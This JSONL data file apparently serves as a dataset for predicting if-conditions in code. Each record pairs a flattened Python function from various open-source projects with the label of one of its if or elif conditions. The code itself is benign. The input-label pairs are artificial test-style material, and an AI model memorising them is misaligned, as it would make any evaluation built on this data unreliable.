{"input": "def set_cover(channel, pixbuf): if self.channel == channel: if pixbuf is not None: self.imgCover.set_from_pixbuf(self.scale_pixbuf(pixbuf)) if self.show_on_cover_load: self.main_window.show() self.show_on_cover_load = False", "label": "if pixbuf is not None :"}
{"input": "def test_infer_shape_matrix(self): # Testing the infer_shape with a matrix. x = theano.tensor.matrix() for op in self.ops: if not op.return_inverse: continue if op.return_index: f = op(x)[2] else: f = op(x)[1] self._compile_and_check( [x], [f], [np.asarray(np.array([[2, 1], [3, 2], [2, 3]]), dtype=config.floatX)], self.op_class, )", "label": "if op . return_index :"}
{"input": "def Filter(self, match=None, **_): \"\"\"Filter the current expression.\"\"\" arg = self.stack.pop(-1) # Filters can be specified as a comma separated list. for filter_name in match.group(1).split(\",\"): filter_object = ConfigFilter.classes_by_name.get(filter_name) if filter_object is None: raise FilterError(\"Unknown filter function %r\" % filter_name) if not filter_object.sensitive_arg: logging.debug(\"Applying filter %s for %s.\", filter_name, arg) arg = filter_object().Filter(arg) precondition.AssertType(arg, Text) self.stack[-1] += arg", "label": "if not filter_object . sensitive_arg :"}
{"input": "def enqueue_link(self, fuzzresult, link_url, parsed_link): # dir path if self.add_path: split_path = parsed_link.path.split(\"/\") newpath = \"/\".join(split_path[:-1]) + \"/\" self.queue_url(urljoin(fuzzresult.url, newpath)) # file path new_link = urljoin(fuzzresult.url, link_url) if not self.regex_param or ( self.regex_param and self.regex_param.search(new_link) is not None ): if self.enqueue_links: self.queue_url(new_link) self.add_result(\"link\", \"New link found\", new_link)", "label": "if self . enqueue_links :"}
{"input": "def old_save(self, *args, **kwargs): \"Override save to set Subscribers and send Notifications\" original = None original_assigned = [] if hasattr(self, \"instance\"): try: original = Task.objects.get(pk=self.instance.id) original_assigned = list(original.assigned.all()) except Task.DoesNotExist: pass instance = super(TaskForm, self).save(*args, **kwargs) if original: new_assigned = list(self.cleaned_data[\"assigned\"]) if original_assigned != new_assigned: for assignee in new_assigned: self.instance.subscribers.add(assignee) return instance", "label": "if original_assigned != new_assigned :"}
{"input": "def get_test_layer(): layers = get_bb_var(\"BBLAYERS\").split() testlayer = None for l in layers: if \"~\" in l: l = os.path.expanduser(l) if \"/meta-selftest\" in l and os.path.isdir(l): testlayer = l break return testlayer", "label": "if \"/meta-selftest\" in l and os . path . isdir ( l ) :"}
{"input": "def readable(request): \"\"\"Display a readable version of this url if we can\"\"\" rdict = request.matchdict bid = rdict.get(\"hash_id\", None) username = rdict.get(\"username\", None) if bid: found = BmarkMgr.get_by_hash(bid, username=username) if found: return { \"bmark\": found, \"username\": username, } else: return HTTPNotFound()", "label": "if found :"}
{"input": "def pythonpath(conanfile): python_path = conanfile.env.get(\"PYTHONPATH\", None) if python_path: old_path = sys.path[:] if isinstance(python_path, list): sys.path.extend(python_path) else: sys.path.append(python_path) yield sys.path = old_path else: yield", "label": "if isinstance ( python_path , list ) :"}
{"input": "def _validate(self): on_target_delete = None for cmd in self.val.commands: if isinstance(cmd, qlast.OnTargetDelete): if on_target_delete: raise errors.EdgeQLSyntaxError( f\"more than one 'on target delete' specification\", context=cmd.context, ) else: on_target_delete = cmd", "label": "if on_target_delete :"}
{"input": "def _choose_instance(self, timeout_time): \"\"\"Returns an Instance to handle a request or None if all are busy.\"\"\" with self._condition: while time.time() < timeout_time and not self._quit_event.is_set(): for inst in self._instances: if inst.can_accept_requests: return inst else: inst = self._start_any_instance() if inst: break self._condition.wait(timeout_time - time.time()) else: return None if inst: inst.wait(timeout_time) return inst", "label": "if inst :"}
{"input": "def get_identifiers(self): ids = [] for entry in glob.glob(f\"{self._base_path}/ctl-*\"): ident = entry.split(\"-\", 1)[-1] if ident.endswith(\"ioctl\"): continue if os.path.exists(os.path.join(entry, \"disk_octets.rrd\")): ids.append(ident) ids.sort(key=RRDBase._sort_ports) return ids", "label": "if ident . endswith ( \"ioctl\" ) :"}
{"input": "def read_vocab_list(path, max_vocab_size=20000): vocab = {\"<eos>\": 0, \"<unk>\": 1} with io.open(path, encoding=\"utf-8\", errors=\"ignore\") as f: for l in f: w = l.strip() if w not in vocab and w: vocab[w] = len(vocab) if len(vocab) >= max_vocab_size: break return vocab", "label": "if w not in vocab and w :"}
{"input": "def n_import_from(self, node): relative_path_index = 0 if self.version >= 2.5: if node[relative_path_index].pattr > 0: node[2].pattr = (\".\" * node[relative_path_index].pattr) + node[2].pattr if self.version > 2.7: if isinstance(node[1].pattr, tuple): imports = node[1].pattr for pattr in imports: node[1].pattr = pattr self.default(node) return pass self.default(node)", "label": "if isinstance ( node [ 1 ] . pattr , tuple ) :"}
{"input": "def get(self): \"\"\"Returns a simple HTML for contact form\"\"\" if self.user: user_info = models.User.get_by_id(long(self.user_id)) if user_info.name or user_info.last_name: self.form.name.data = user_info.name + \" \" + user_info.last_name if user_info.email: self.form.email.data = user_info.email params = {\"exception\": self.request.get(\"exception\")} return self.render_template(\"boilerplate_contact.html\", **params)", "label": "if user_info . name or user_info . last_name :"}
{"input": "def task_management_menu(activation, request): \"\"\"Available tasks actions.\"\"\" actions = [] if request.user.has_perm(activation.flow_class._meta.manage_permission_name): for transition in activation.get_available_transitions(): if transition.can_proceed(activation): url = activation.flow_task.get_task_url( activation.task, transition.name, user=request.user, namespace=request.resolver_match.namespace, ) if url: actions.append((transition.name.replace(\"_\", \" \").title(), url)) return {\"actions\": actions, \"request\": request}", "label": "if url :"}
{"input": "def discover_misago_admin(): for app in apps.get_app_configs(): module = import_module(app.name) if not hasattr(module, \"admin\"): continue admin_module = import_module(\"%s.admin\" % app.name) if hasattr(admin_module, \"MisagoAdminExtension\"): extension = getattr(admin_module, \"MisagoAdminExtension\")() if hasattr(extension, \"register_navigation_nodes\"): extension.register_navigation_nodes(site) if hasattr(extension, \"register_urlpatterns\"): extension.register_urlpatterns(urlpatterns)", "label": "if hasattr ( extension , \"register_urlpatterns\" ) :"}
{"input": "def dequeue(self): with self.db(commit=True) as curs: curs.execute( \"select id, data from task where queue = ? \" \"order by priority desc, id limit 1\", (self.name,), ) result = curs.fetchone() if result is not None: tid, data = result curs.execute(\"delete from task where id = ?\", (tid,)) if curs.rowcount == 1: return to_bytes(data)", "label": "if curs . rowcount == 1 :"}
{"input": "def readHexStringFromStream(stream): stream.read(1) txt = \"\" x = b_(\"\") while True: tok = readNonWhitespace(stream) if not tok: # stream has truncated prematurely raise PdfStreamError(\"Stream has ended unexpectedly\") if tok == b_(\">\"): break x += tok if len(x) == 2: txt += chr(int(x, base=16)) x = b_(\"\") if len(x) == 1: x += b_(\"0\") if len(x) == 2: txt += chr(int(x, base=16)) return createStringObject(b_(txt))", "label": "if not tok :"}
{"input": "def test_compute_gradient(self): for y, y_pred in zip(self.y_list, self.predict_list): lse_grad = self.lae_loss.compute_grad(y, y_pred) diff = y_pred - y if diff > consts.FLOAT_ZERO: grad = 1 elif diff < consts.FLOAT_ZERO: grad = -1 else: grad = 0 self.assertTrue(np.fabs(lse_grad - grad) < consts.FLOAT_ZERO)", "label": "elif diff < consts . FLOAT_ZERO :"}
{"input": "def request_get(request, key, default_value=None): if key in request.args: return request.args.get(key) elif key in request.form: return request.form.get(key) try: json_body = request.get_json(force=True, silent=True) if key in json_body: return json_body[key] else: return default_value except Exception: return default_value", "label": "if key in json_body :"}
{"input": "def _getResourceData(self, jid, dataname): \"\"\"Return specific jid's resource representation in internal format. Used internally.\"\"\" if jid.find(\"/\") + 1: jid, resource = jid.split(\"/\", 1) if self._data[jid][\"resources\"].has_key(resource): return self._data[jid][\"resources\"][resource][dataname] elif self._data[jid][\"resources\"].keys(): lastpri = -129 for r in self._data[jid][\"resources\"].keys(): if int(self._data[jid][\"resources\"][r][\"priority\"]) > lastpri: resource, lastpri = r, int(self._data[jid][\"resources\"][r][\"priority\"]) return self._data[jid][\"resources\"][resource][dataname]", "label": "if self . _data [ jid ] [ \"resources\" ] . has_key ( resource ) :"}
{"input": "def GetBoundingBoxMin(self): \"\"\"Get the minimum bounding box.\"\"\" x1, y1 = 10000, 10000 x2, y2 = -10000, -10000 for point in self._lineControlPoints: if point[0] < x1: x1 = point[0] if point[1] < y1: y1 = point[1] if point[0] > x2: x2 = point[0] if point[1] > y2: y2 = point[1] return x2 - x1, y2 - y1", "label": "if point [ 1 ] > y2 :"}
{"input": "def produce_etag_headers(self, filename): \"\"\"Produce a dict of curl headers containing etag headers from the download.\"\"\" headers = {} # If the download file already exists, add some headers to the request # so we don't retrieve the content if it hasn't changed if os.path.exists(filename): self.existing_file_size = os.path.getsize(filename) etag = self.getxattr(self.xattr_etag) last_modified = self.getxattr(self.xattr_last_modified) if etag: headers[\"If-None-Match\"] = etag if last_modified: headers[\"If-Modified-Since\"] = last_modified return headers", "label": "if etag :"}
{"input": "def _find_orientation_offset(self, header): (ifd_offset,) = self._unpack(\"L\", header[4:]) self.exif_buffer.seek(ifd_offset) # Read tag directory for _ in range(self._unpack(\"H\", self.exif_buffer.read(2))[0]): # Each tag is 12 bytes. HHL4s = tag, type, count, data # Read tag and ignore the rest (tag,) = self._unpack(\"H10x\", self.exif_buffer.read(12)) if tag == 0x0112: # Orientation tag self._offset = ( self.exif_buffer.tell() - 4 ) # Back 4 bytes to the start of data break", "label": "if tag == 0x0112 :"}
{"input": "def _start(self): try: await self.fire_event(\"pre_request\") except AbortEvent: self.logger.debug(\"Abort request %s\", self.request) else: if self._request is not None: try: self.start_request() except Exception as exc: self.finished(exc=exc)", "label": "if self . _request is not None :"}
{"input": "def buildQueryRE(queryText, caseSensitive, wholeWord): \"returns a RegEx pattern for searching for the given queryText\" # word detection etc. cannot be done on an encoding-less string: assert type(queryText) == unicode pattern = re.escape(queryText) if wholeWord: if re.search(\"^\\w\", queryText, re.UNICODE): pattern = \"\\\\b\" + pattern if re.search(\"\\w$\", queryText, re.UNICODE): pattern = pattern + \"\\\\b\" flags = re.UNICODE if not (caseSensitive): flags |= re.IGNORECASE return re.compile(pattern, flags)", "label": "if re . search ( \"^\\w\" , queryText , re . UNICODE ) :"}
{"input": "def filter(callbackfn): array = this.to_object() arr_len = array.get(\"length\").to_uint32() if not callbackfn.is_callable(): raise this.MakeError(\"TypeError\", \"callbackfn must be a function\") T = arguments[1] res = [] k = 0 while k < arr_len: if array.has_property(str(k)): kValue = array.get(str(k)) if callbackfn.call(T, (kValue, this.Js(k), array)).to_boolean().value: res.append(kValue) k += 1 return res # converted to js array automatically", "label": "if array . has_property ( str ( k ) ) :"}
{"input": "def action(self, params): if len(params) < 1: return CommandsResponse(STATUS_ERROR, \"Not enough params\") else: vrf_name = params[0] if len(params) == 2: vrf_rf = params[1] else: vrf_rf = \"ipv4\" from ryu.services.protocols.bgp.operator.internal_api import WrongParamError try: return CommandsResponse( STATUS_OK, self.api.count_single_vrf_routes(vrf_name, vrf_rf) ) except WrongParamError as e: return WrongParamResp(e)", "label": "if len ( params ) == 2 :"}
{"input": "def __init__(self, layers): super(Add, self).__init__() self.layer_names = [] self.layers = layers for i, layer in enumerate(self.layers): if layer.parent is None: if i == 0: layer.parent = \"input\" else: layer.parent = layers[i - 1].name if hasattr(layer, \"name\"): name = layer.name else: name = layer.__class__.__name__ + str(i) layer.name = name self.layer_names.append(name)", "label": "if hasattr ( layer , \"name\" ) :"}
{"input": "def _grouping_intervals(grouping): last_interval = None for interval in grouping: # if grouping is -1, we are done if interval == CHAR_MAX: return # 0: re-use last group ad infinitum if interval == 0: if last_interval is None: raise ValueError(\"invalid grouping\") while True: yield last_interval yield interval last_interval = interval", "label": "if last_interval is None :"}
{"input": "def infer_expected_xp_and_device(self, x): xp = backend.get_array_module(x) if xp is np: return xp, None elif xp is cuda.cupy: return xp, x.device elif xp is chainerx: backend_name = x.device.backend.name if backend_name == \"native\": return np, None elif backend_name == \"cuda\": return cuda.cupy, cuda.cupy.cuda.Device(x.device.index) assert False", "label": "if backend_name == \"native\" :"}
{"input": "def _escape_attrib(text): # escape attribute value try: if \"&\" in text: text = text.replace(\"&\", \"&amp;\") if \"<\" in text: text = text.replace(\"<\", \"&lt;\") if \">\" in text: text = text.replace(\">\", \"&gt;\") if '\"' in text: text = text.replace('\"', \"&quot;\") if \"\\n\" in text: text = text.replace(\"\\n\", \"&#10;\") return text except (TypeError, AttributeError): # pragma: no cover _raise_serialization_error(text)", "label": "if \">\" in text :"}
{"input": "def get_block_id_at_height(store, height, descendant_id): if height is None: return None while True: block = store._load_block(descendant_id) if block[\"height\"] == height: return descendant_id descendant_id = block[ \"search_id\" if util.get_search_height(block[\"height\"]) >= height else \"prev_id\" ]", "label": "if util . get_search_height ( block [ \"height\" ] ) >= height"}
{"input": "def train(config, checkpoint_dir=None): if checkpoint_dir: assert os.path.exists(checkpoint_dir) for step in range(10): if step % 3 == 0: with tune.checkpoint_dir(step=step) as checkpoint_dir: path = os.path.join(checkpoint_dir, \"checkpoint\") with open(path, \"w\") as f: f.write(json.dumps({\"step\": step})) tune.report(test=step)", "label": "if step % 3 == 0 :"}
{"input": "def onMinimize(self, sender): if self._runDialogListener(\"onMinimize\") is False: return widget = self.child if widget is not None: if widget.isVisible(): widget.setVisible(False) self.setHeight(\"\") self.setWidth(\"\") if self._maximized: self._minimized = self._maximized self._toggleMaximize() else: self._minimized = None else: if self._minimized is not None: self._toggleMaximize() widget.setVisible(True)", "label": "if self . _minimized is not None :"}
{"input": "def apply_transformation(self, ti: TransformationInput) -> Transformation: # Insert fragments after the last line. if ti.lineno == ti.document.line_count - 1: buffer = ti.buffer_control.buffer if buffer.suggestion and ti.document.is_cursor_at_the_end: suggestion = buffer.suggestion.text else: suggestion = \"\" return Transformation(fragments=ti.fragments + [(self.style, suggestion)]) else: return Transformation(fragments=ti.fragments)", "label": "if buffer . suggestion and ti . document . is_cursor_at_the_end :"}
{"input": "def get_measurements(self, pipeline, object_name, category): if object_name == IMAGE and category == C_COUNT: return [self.object_name.value] elif object_name == self.object_name: if category == C_LOCATION: return [ FTR_CENTER_X, FTR_CENTER_Y, ] elif category == C_NUMBER: return [FTR_OBJECT_NUMBER] elif category == C_WORMS: return [F_ANGLE] return []", "label": "if category == C_LOCATION :"}
{"input": "def traverse(tensors): \"\"\"traverse all ops to find attached workload\"\"\" for t in tensors: op = t.op if \"workload\" in op.attrs: return args_to_workload(op.attrs[\"workload\"]) wkl = traverse(op.input_tensors) if wkl: return wkl return None", "label": "if \"workload\" in op . attrs :"}
{"input": "def _pack(converter, node: Any, inputs: List[str]) -> Any: final_inputs = [] for x_in in inputs: input_c = converter.outputs[x_in] if isinstance(input_c, tf.compat.v1.NodeDef): final_inputs.append(_nodef_to_private_pond(converter, input_c)) else: final_inputs.append(input_c) return converter.protocol.stack(final_inputs, axis=node.attr[\"axis\"].i)", "label": "if isinstance ( input_c , tf . compat . v1 . NodeDef ) :"}
{"input": "def __init__(self, instance=None, data=empty, **kwargs): context = kwargs.get(\"context\", {}) if \"product\" in context: instance = self.get_instance(context, data, kwargs) if data is not empty and \"quantity\" in data: quantity = self.fields[\"quantity\"].to_internal_value(data[\"quantity\"]) else: quantity = self.fields[\"quantity\"].default instance.setdefault(\"quantity\", quantity) super().__init__(instance, data, context=context) else: super().__init__(instance, data, **kwargs)", "label": "if data is not empty and \"quantity\" in data :"}
{"input": "def serialize(self, value): if value is not None: try: iter(value) except TypeError: value = [value] if len(value): return [self.element_serialize(val) for val in sorted(value)] return None", "label": "if len ( value ) :"}
{"input": "def remove_cloner_curve(self, obj_index): # opportunity to remove the .cloner. if self.selected_mode == \"Duplicate\": curve_name = f\"{self.basedata_name}.cloner.{obj_index:04d}\" cu = bpy.data.curves.get(curve_name) if cu: bpy.data.curves.remove(cu)", "label": "if cu :"}
{"input": "def update_advance_paid(self): advance_paid = frappe._dict() for d in self.get(\"accounts\"): if d.is_advance: if d.reference_type in ( \"Sales Order\", \"Purchase Order\", \"Employee Advance\", ): advance_paid.setdefault(d.reference_type, []).append(d.reference_name) for voucher_type, order_list in iteritems(advance_paid): for voucher_no in list(set(order_list)): frappe.get_doc(voucher_type, voucher_no).set_total_advance_paid()", "label": "if d . is_advance :"}
{"input": "def handle(self, msg): self._mic.send(msg) for calculate_seed, make_delegate, dict in self._delegate_records: id = calculate_seed(msg) if id is None: continue elif isinstance(id, collections.Hashable): if id not in dict or not dict[id].is_alive(): d = make_delegate((self, msg, id)) d = self._ensure_startable(d) dict[id] = d dict[id].start() else: d = make_delegate((self, msg, id)) d = self._ensure_startable(d) d.start()", "label": "if id not in dict or not dict [ id ] . is_alive ( ) :"}
{"input": "def _get_default_factory(self, attribute_name: str) -> Any: if hasattr(self, attribute_name): if str(getattr(self, attribute_name)).startswith(\"${\"): return str(getattr(self, attribute_name)) elif str(self.__dataclass_fields__[attribute_name].default).startswith(\"${\"): return str(self.__dataclass_fields__[attribute_name].default) elif ( getattr(self, attribute_name) != self.__dataclass_fields__[attribute_name].default_factory() ): return getattr(self, attribute_name) return self.__dataclass_fields__[attribute_name].default_factory()", "label": "elif str ( self . __dataclass_fields__ [ attribute_name ] . default ) . startswith ( \"${\" ) :"}
{"input": "def showMenu(self, show): if show: if self.canvas.menu is None: self.canvas.menu = Menu(self.canvas, tearoff=0) self.canvas.menu.add_command(label=\"delete\", command=self._delete) self.canvas.menu.bind(\"<FocusOut>\", lambda e: self.canvas.menu.unpost()) self._bindMenu() else: # need to go through and unbind... pass", "label": "if self . canvas . menu is None :"}
{"input": "def __init__(self, db, where=None): self._db = db self._tables = [] self.filters = [] if hasattr(where, \"get_all\"): self.where = where self._tables.insert(0, where.get_all) elif hasattr(where, \"get_one\") and isinstance(where.get_one, QueryException): self.where = where.get_one else: # find out which tables are involved if isinstance(where, Query): self.filters = where.left self.where = where self._tables = [field._tablename for (field, op, val) in self.filters]", "label": "if isinstance ( where , Query ) :"}
{"input": "def main(): try: from wsgiref.simple_server import make_server from wsgiref.validate import validator if port[0] == 0: port[0] = get_open_port() wsgi_application = WsgiApplication(soap11_application) server = make_server(host, port[0], validator(wsgi_application)) logger.info(\"Starting interop server at %s:%s.\" % (\"0.0.0.0\", port[0])) logger.info(\"WSDL is at: /?wsdl\") server.serve_forever() except ImportError: print(\"Error: example server code requires Python >= 2.5\")", "label": "if port [ 0 ] == 0 :"}
{"input": "def try_adjust_widgets(self): if hasattr(self.parent, \"adjust_widgets\"): self.parent.adjust_widgets() if hasattr(self.parent, \"parentApp\"): if hasattr(self.parent.parentApp, \"_internal_adjust_widgets\"): self.parent.parentApp._internal_adjust_widgets() if hasattr(self.parent.parentApp, \"adjust_widgets\"): self.parent.parentApp.adjust_widgets()", "label": "if hasattr ( self . parent . parentApp , \"_internal_adjust_widgets\" ) :"}
{"input": "def copy_file_replace_line( orig_file: Path, new_file: Path, line_re: str, new_line: str ) -> None: old_version_fh = orig_file.open(\"r\") new_version_fh = new_file.open(\"w\") for line in old_version_fh: if re.search(line_re, line): new_version_fh.write(new_line + \"\\n\") else: new_version_fh.write(line) old_version_fh.close() new_version_fh.close()", "label": "if re . search ( line_re , line ) :"}
{"input": "def _protoc_plugin_parameters(self, language): \"\"\"Return a tuple of (plugin path, vars) used as parameters for ninja build.\"\"\" path, vars = \"\", {} for p in self.attr[\"protoc_plugins\"]: if language in p.code_generation: path = p.path flag = p.protoc_plugin_flag(self.build_dir) vars = {\"protoc%spluginflags\" % language: flag} break return path, vars", "label": "if language in p . code_generation :"}
{"input": "def scan_page(self, address_space, page_offset, fullpage=False): \"\"\"Runs through patchers for a single page\"\"\" if fullpage: pagedata = address_space.read(page_offset, PAGESIZE) for patcher in self.patchers: for offset, data in patcher.get_constraints(): if fullpage: testdata = pagedata[offset : offset + len(data)] else: testdata = address_space.read(page_offset + offset, len(data)) if data != testdata: break else: yield patcher", "label": "if fullpage :"}
{"input": "def OnLeftDClick(self, event): pt = event.GetPosition() item, flags = self.tree.HitTest(pt) if item: self.log.WriteText(\"OnLeftDClick: %s\\n\" % self.tree.GetItemText(item)) parent = self.tree.GetItemParent(item) if parent.IsOk(): self.tree.SortChildren(parent) event.Skip()", "label": "if parent . IsOk ( ) :"}
{"input": "def drop_pathlist(self, pathlist): \"\"\"Drop path list\"\"\" if pathlist: files = [\"r'%s'\" % path for path in pathlist] if len(files) == 1: text = files[0] else: text = \"[\" + \", \".join(files) + \"]\" if self.new_input_line: self.on_new_line() self.insert_text(text) self.setFocus()", "label": "if len ( files ) == 1 :"}
{"input": "def func_set_exporter_funcs_opset_yaml(func_set): if len(list(func_set)[0].split(\"@\")) == 1: yaml_data = {} for nnabla_func, impl_funcs in _onnx_func_info.items(): if nnabla_func in func_set: yaml_data[nnabla_func] = impl_funcs return yaml.dump(yaml_data, default_flow_style=False) else: return yaml.dump(list(func_set), default_flow_style=False)", "label": "if nnabla_func in func_set :"}
{"input": "def object_hook(obj): obj_len = len(obj) if obj_len == 1: if \"$date\" in obj: return datetime.fromtimestamp( obj[\"$date\"] / 1000, tz=timezone.utc ) + timedelta(milliseconds=obj[\"$date\"] % 1000) if \"$time\" in obj: return time(*[int(i) for i in obj[\"$time\"].split(\":\")]) if obj_len == 2 and \"$type\" in obj and \"$value\" in obj: if obj[\"$type\"] == \"date\": return date(*[int(i) for i in obj[\"$value\"].split(\"-\")]) return obj", "label": "if obj [ \"$type\" ] == \"date\" :"}
{"input": "def start(self, para=None, callback=None): if not self.load(): return if para != None or self.show(): if para == None: para = self.para win = WidgetsManager.getref(\"Macros Recorder\") if win != None: win.write(\"{}>{}\".format(self.title, para)) if self.asyn and IPy.uimode() != \"no\": threading.Thread(target=self.runasyn, args=(para, callback)).start() else: self.runasyn(para, callback)", "label": "if win != None :"}
{"input": "def user(self): if not self._conan_user: _env_username = os.getenv(\"CONAN_USERNAME\") conan_v2_error( \"Environment variable 'CONAN_USERNAME' is deprecated\", _env_username ) self._conan_user = _env_username or self.default_user if not self._conan_user: raise ConanException(\"user not defined, but self.user is used in conanfile\") return self._conan_user", "label": "if not self . _conan_user :"}
{"input": "def _get_vars(cls, func): # log.debug(\"Getting vars for %s\", func) params = inspect.signature(func).parameters.copy() args = {} # log.debug(\"Got %s\", params) for name, param in params.items(): # log.debug(\"Checking arg %s, type %s\", name, param.kind) if param.kind is param.POSITIONAL_OR_KEYWORD and param.default is None: # log.debug(\"Using var %s\", name) args[name] = _get_variable(name) # log.debug(\"Collected var for arg '%s': %s\", name, args[name]) return args", "label": "if param . kind is param . POSITIONAL_OR_KEYWORD and param . default is None :"}
{"input": "def parts(self): klass = self.__class__ this = list() for token in self: if token.startswith_fws(): if this: yield this[0] if len(this) == 1 else klass(this) this.clear() end_ws = token.pop_trailing_ws() this.append(token) if end_ws: yield klass(this) this = [end_ws] if this: yield this[0] if len(this) == 1 else klass(this)", "label": "if end_ws :"}
{"input": "def start_fileoutput(self): \"\"\"Start output to configured file.\"\"\" path = os.path.dirname(self.filename) try: if path and not os.path.isdir(path): os.makedirs(path) self.fd = self.create_fd() self.close_fd = True except IOError: msg = sys.exc_info()[1] log.warn( LOG_CHECK, \"Could not open file %r for writing: %s\\n\" \"Disabling log output of %s\", self.filename, msg, self, ) self.fd = dummy.Dummy() self.is_active = False self.filename = None", "label": "if path and not os . path . isdir ( path ) :"}
{"input": "def worksheet_id(self, value): if self._worksheet: if self._worksheet.id == value: return else: raise InvalidArgumentValue( \"This range already has a worksheet with different id set.\" ) self._worksheet_id = value", "label": "if self . _worksheet . id == value :"}
{"input": "def _sanity_check(self, kind, triplets): route_id = self.data.get(\"route_id\", [None])[0] if route_id or [ k for k in self.data.keys() if k[:5] in (\"route\", \"smtp-\", \"sourc\", \"secur\", \"local\") ]: if len(triplets) > 1 or kind != \"profile\": raise ValueError( \"Can only configure detailed settings \" \"for one profile at a time\" )", "label": "if len ( triplets ) > 1 or kind != \"profile\" :"}
{"input": "def _process_property_change(self, msg): msg = super(Select, self)._process_property_change(msg) if \"value\" in msg: if not self.values: pass elif msg[\"value\"] is None: msg[\"value\"] = self.values[0] else: if isIn(msg[\"value\"], self.unicode_values): idx = indexOf(msg[\"value\"], self.unicode_values) else: idx = indexOf(msg[\"value\"], self.labels) msg[\"value\"] = self._items[self.labels[idx]] msg.pop(\"options\", None) return msg", "label": "if not self . values :"}
{"input": "def emit(self, record): msg = record.getMessage() ### if record.exc_info: _type, value, tback = record.exc_info tback_text = \"\".join(traceback.format_exception(_type, value, tback)) if msg: msg += \"\\n\" msg += tback_text ### self.tktext.insert( \"end\", msg + \"\\n\", record.levelname, )", "label": "if msg :"}
{"input": "def _get_pip_index_urls(sources): index_urls = [] trusted_hosts = [] for source in sources: url = source.get(\"url\") if not url: continue index_urls.append(url) if source.get(\"verify_ssl\", True): continue host = six.moves.urllib.parse.urlparse(source[\"url\"]).hostname trusted_hosts.append(host) return index_urls, trusted_hosts", "label": "if source . get ( \"verify_ssl\" , True ) :"}
{"input": "def _is_binary(fname, limit=80): try: with open(fname, \"rb\") as f: for i in range(limit): char = f.read(1) if char == b\"\\0\": return True if char == b\"\\n\": return False if char == b\"\": return except OSError as e: if xp.ON_WINDOWS and is_app_execution_alias(fname): return True raise e return False", "label": "if char == b\"\\n\" :"}
{"input": "def tearDown(self): exc, _, _ = sys.exc_info() if exc: try: if hasattr(self, \"obj\") and isinstance(self.obj, SelfDiagnosable): diags = self.obj.get_error_diagnostics() if diags: for line in diags: ROOT_LOGGER.info(line) except BaseException: pass if self.captured_logger: self.captured_logger.removeHandler(self.log_recorder) self.log_recorder.close() sys.stdout = self.stdout_backup super(BZTestCase, self).tearDown()", "label": "if diags :"}
{"input": "def _disconnect(self, sync): if self._connection: if sync: try: self._connection.send_all() self._connection.fetch_all() except (WorkspaceError, ServiceUnavailable): pass if self._connection: self._connection.in_use = False self._connection = None self._connection_access_mode = None", "label": "if self . _connection :"}
{"input": "def _recursive_process(self): super(RecursiveObjectDownwardsVisitor, self)._recursive_process() while self._new_for_visit: func_ea, arg_idx = self._new_for_visit.pop() if helper.is_imported_ea(func_ea): continue cfunc = helper.decompile_function(func_ea) if cfunc: assert arg_idx < len(cfunc.get_lvars()), \"Wrong argument at func {}\".format( to_hex(func_ea) ) obj = VariableObject(cfunc.get_lvars()[arg_idx], arg_idx) self.prepare_new_scan(cfunc, arg_idx, obj) self._recursive_process()", "label": "if cfunc :"}
{"input": "def to_dict(self) -> JSONDict: data = dict() for key in iter(self.__dict__): if key == \"bot\" or key.startswith(\"_\"): continue value = self.__dict__[key] if value is not None: if hasattr(value, \"to_dict\"): data[key] = value.to_dict() else: data[key] = value if data.get(\"from_user\"): data[\"from\"] = data.pop(\"from_user\", None) return data", "label": "if key == \"bot\" or key . startswith ( \"_\" ) :"}
{"input": "def get_data(self, path, prefix=\"\"): item = self.store[path] path = \"{}/{}\".format(prefix, path) keys = [i for i in item.keys()] data = {\"path\": path} # print(path) for k in keys: if not isinstance(item[k], h5py.Group): dataset = np.array(item[k].value) if type(dataset) is np.ndarray: if dataset.size != 0: if type(dataset[0]) is np.bytes_: dataset = [a.decode(\"ascii\") for a in dataset] data.update({k: dataset}) return data", "label": "if not isinstance ( item [ k ] , h5py . Group ) :"}
{"input": "def _macros_of_type(root, type, el_func): macros_el = root.find(\"macros\") macro_dict = {} if macros_el is not None: macro_els = macros_el.findall(\"macro\") filtered_els = [ (macro_el.get(\"name\"), el_func(macro_el)) for macro_el in macro_els if macro_el.get(\"type\") == type ] macro_dict = dict(filtered_els) return macro_dict", "label": "if macro_el . get ( \"type\" ) == type"}
{"input": "def get_referrers(self): d = [] for o in gc.get_referrers(self.obj): name = None if isinstance(o, dict): name = web.dictfind(o, self.obj) for r in gc.get_referrers(o): if getattr(r, \"__dict__\", None) is o: o = r break elif isinstance(o, dict): # other dict types name = web.dictfind(o, self.obj) if not isinstance(name, six.string_types): name = None d.append(Object(o, name)) return d", "label": "if isinstance ( o , dict ) :"}
{"input": "def MakeWidthArray(fm): # Make character width array s = \"{\\n\\t\" cw = fm[\"Widths\"] for i in xrange(0, 256): if chr(i) == \"'\": s += \"'\\\\''\" elif chr(i) == \"\\\\\": s += \"'\\\\\\\\'\" elif i >= 32 and i <= 126: s += \"'\" + chr(i) + \"'\" else: s += \"chr(%d)\" % i s += \":\" + fm[\"Widths\"][i] if i < 255: s += \",\" if (i + 1) % 22 == 0: s += \"\\n\\t\" s += \"}\" return s", "label": "elif chr ( i ) == \"\\\\\" :"}
{"input": "def getLatestFile(self): highestNsp = None highestNsx = None for nsp in self.getFiles(): try: if nsp.path.endswith(\".nsx\"): if not highestNsx or int(nsp.version) > int(highestNsx.version): highestNsx = nsp else: if not highestNsp or int(nsp.version) > int(highestNsp.version): highestNsp = nsp except BaseException: pass return highestNsp or highestNsx", "label": "if not highestNsx or int ( nsp . version ) > int ( highestNsx . version ) :"}
{"input": "def _check_integrity(self) -> bool: # Allow original archive to be deleted (zip). Only need the extracted images all_files = self.FILE_LIST.copy() all_files.append(self.ANNOTATIONS_FILE) for (_, md5, filename) in all_files: file, ext = os.path.splitext(filename) extracted_dir = os.path.join(self.root, file) if not os.path.exists(extracted_dir): return False return True", "label": "if not os . path . exists ( extracted_dir ) :"}
{"input": "def load_core(self): for filename in os.listdir(self.path): if filename != \"__init__.py\" and filename.endswith(\".py\"): try: name = filename.replace(\".py\", \"\") mod = load_python_module(name, self.path) self._load_cmd_from(mod) except: warnings.warn( \"!! Warning: could not load core command file \" + filename, RuntimeWarning, )", "label": "if filename != \"__init__.py\" and filename . endswith ( \".py\" ) :"}
{"input": "def _make_dataset(key, data, size): if isinstance(data, chainer.get_array_types()): if key is None: key = \"_{}\".format(id(data)) return _Array(key, data) elif isinstance(data, list): if key is None: key = \"_{}\".format(id(data)) return _List(key, data) elif callable(data): if key is None: raise ValueError(\"key(s) must be specified for callable\") if size is None: raise ValueError(\"size must be specified for callable\") return _Index(size).transform(key, data)", "label": "if size is None :"}
